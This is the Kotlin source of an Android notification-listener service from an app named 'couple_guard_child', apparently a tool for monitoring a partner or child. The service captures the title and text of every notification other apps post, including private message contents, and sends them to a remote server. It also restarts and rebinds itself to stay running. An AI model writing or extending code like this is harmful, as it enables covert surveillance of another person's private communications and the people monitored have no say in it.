package com.example.couple_guard_child.services

import android.content.Intent
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import com.example.couple_guard_child.utils.ApiClient
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import java.util.concurrent.Executors
import java.util.concurrent.ScheduledExecutorService
import java.util.concurrent.TimeUnit

class NotificationListenerServiceImpl : NotificationListenerService() {
    private val TAG = "NotificationListener"
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private val executor = Executors.newSingleThreadExecutor()
    private var heartbeatExecutor: ScheduledExecutorService? = null

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "✅ NotificationListenerService created")
        startHeartbeat()
    }

    // ✅ ADDED: This tells Android to restart service if killed
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "📱 onStartCommand called")
        return START_STICKY
    }

    // ✅ ADDED: Heartbeat to prove service is alive
    private fun startHeartbeat() {
        heartbeatExecutor = Executors.newScheduledThreadPool(1)
        heartbeatExecutor?.scheduleAtFixedRate({
            Log.d(TAG, "💓 Service is ALIVE - Heartbeat")
        }, 0, 30, TimeUnit.SECONDS)
    }

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        super.onNotificationPosted(sbn)
        
        sbn?.let {
            try {
                val packageName = it.packageName
                val notification = it.notification
                
                // Skip system notifications
                if (packageName == "android" || 
                    packageName == "com.android.systemui" ||
                    packageName.contains("launcher")) {
                    return
                }
                
                // Skip our own notifications
                if (packageName == applicationContext.packageName) {
                    return
                }
                
                val extras = notification.extras
                val title = extras.getString("android.title") ?: ""
                val text = extras.getCharSequence("android.text")?.toString() ?: ""
                val bigText = extras.getCharSequence("android.bigText")?.toString() ?: ""
                
                val content = if (bigText.isNotEmpty()) bigText else text
                
                if (title.isEmpty() && content.isEmpty()) {
                    Log.d(TAG, "⏭️ Skipping empty notification from $packageName")
                    return
                }
                
                val appName = try {
                    val appInfo = packageManager.getApplicationInfo(packageName, 0)
                    packageManager.getApplicationLabel(appInfo).toString()
                } catch (e: Exception) {
                    packageName
                }
                
                Log.d(TAG, "📧 Notification received:")
                Log.d(TAG, "  App: $appName ($packageName)")
                Log.d(TAG, "  Title: $title")
                Log.d(TAG, "  Content: ${content.take(100)}${if(content.length > 100) "..." else ""}")
                
                // Send to server asynchronously
                executor.execute {
                    val success = ApiClient.sendNotification(
                        applicationContext,
                        appName,
                        title,
                        content
                    )
                    
                    if (success) {
                        Log.d(TAG, "✅ Notification sent to server")
                    } else {
                        Log.e(TAG, "❌ Failed to send notification to server")
                    }
                }
                
            } catch (e: Exception) {
                Log.e(TAG, "❌ Error processing notification", e)
            }
        }
    }

    // ✅ UPDATED: Better monitoring
    override fun onNotificationRemoved(sbn: StatusBarNotification?) {
        super.onNotificationRemoved(sbn)
        Log.d(TAG, "🗑️ Notification removed: ${sbn?.packageName}")
    }

    override fun onListenerConnected() {
        super.onListenerConnected()
        Log.d(TAG, "✅ NotificationListener connected")
        PersistentService.startService(this)
    }

    override fun onListenerDisconnected() {
        super.onListenerDisconnected()
        Log.w(TAG, "⚠️ NotificationListener disconnected")
        
        // Request rebind
        requestRebind(android.content.ComponentName(this, javaClass))
        PersistentService.startService(this)
    }

    override fun onDestroy() {
        super.onDestroy()
        Log.w(TAG, "⚠️ NotificationListenerService destroyed")
        executor.shutdown()
        heartbeatExecutor?.shutdown()
    }
}